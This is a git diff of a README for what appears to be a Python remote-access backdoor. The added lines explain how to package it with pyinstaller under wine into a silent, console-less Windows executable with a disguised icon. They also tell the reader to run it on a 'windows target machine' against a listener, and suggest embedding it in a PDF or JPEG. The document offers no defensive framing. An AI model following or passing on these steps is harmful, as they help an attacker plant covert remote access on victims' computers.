@@ -64,8 +64,10 @@ wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller
 ```
 6. Package the file as follows to an .exe program which runs silently on a windows machine. (Run this command from the folder of your python program.
 ```
-wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe <program.py> --onefile --noconsole
+wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe <program.py> --onefile --noconsole --icon <icon path without double quotes>
 ```
+7. Run the executable from a windows target machine with the listener on your end. Voila ! You will have a connection. 
+
 
 ## Example
 ### Attacker/Control Side
@@ -78,3 +80,9 @@ wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe <program.py> --onefile
 ![alt text](https://github.com/darksidergod/R4B/blob/master/examples/Screenshot%20from%202019-01-19%2012-20-35.png)
 ![alt text](https://github.com/darksidergod/R4B/blob/master/examples/Screenshot%20from%202019-01-19%2012-20-22.png)
 ![alt text](https://github.com/darksidergod/R4B/blob/master/examples/Screenshot%20from%202019-01-19%2012-20-30.png)
+
+## Extending the program
+This program can be extended to a very vast length. It depends on your understanding of the libraries used. Apart from using the program as an icon it can be embedded to a legit-working file like a PDF or a .jpeg file. I didn't include those programs due to their specificity of code. The uploaded code is more open and can be modified to one's need. 
+
+## Libraries 
+socket, subprocess, json, os, base64, sys, shutil  
